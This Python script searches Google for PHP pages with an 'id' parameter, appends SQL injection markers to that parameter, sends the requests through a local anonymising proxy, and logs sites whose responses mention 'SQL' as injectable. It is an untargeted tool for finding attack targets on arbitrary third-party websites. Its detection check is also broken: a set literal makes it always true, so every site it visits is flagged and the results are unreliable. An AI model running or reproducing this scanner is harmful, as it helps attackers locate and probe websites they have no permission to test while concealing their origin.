import os
import urllib
from urllib import parse

import requests
from googlesearch import search

parameter_name = 'id'
endpoint = 'index.php'
pull_of_markers = ["' -- ", "'", "' -- ", ";", "#"]
query_for_google = f'allinurl:/{endpoint}?{parameter_name}='
result_file_name = 'result.txt'

proxies = {'http': 'localhost: 8118',
           'https': 'localhost: 8118',
           }


def get_google(query: str = query_for_google, stop: int = 45) -> list:
    result_list = list()
    google_result = search(query=query, stop=stop, pause=7)
    for url in google_result:
        result_list.append(url)
    return result_list


def change_query_with_marker(url: str, param_name: str, marker_value: str):
    url_parts = list(urllib.parse.urlparse(url))
    query = dict(urllib.parse.parse_qsl(url_parts[4]))
    query.update({param_name: f'{query.get(param_name)}{marker_value}'})
    url_parts[4] = urllib.parse.urlencode(query)
    return urllib.parse.urlunparse(url_parts)


def add_site_info_in_file(url, marker, google_position: int):
    with open(result_file_name, 'a') as file:
        file.write(f'Url: {url}\n')
        file.write(f'Marker: "{marker}"\n')
        file.write(f'Google position: {google_position}\n')
        file.write('-------------------------------------------------------------\n')
        print(f'Added({google_position}): {url}')


def add_sites_with_injection_in_result_file(url: str, google_position: int):
    for marker in pull_of_markers:
        url = change_query_with_marker(url, parameter_name, marker)
        page_as_text = requests.get(url, proxies=proxies).text
        if {page_as_text.__contains__('SQL')}:
            add_site_info_in_file(url, marker, google_position)
            return


def clean_up():
    try:
        os.remove(result_file_name)
    except:
        return


if __name__ == '__main__':
    clean_up()
    print('cleaned')
    google_links = get_google()
    print('google links ready to use')
    for i in range(len(google_links)):
        add_sites_with_injection_in_result_file(google_links[i], i)
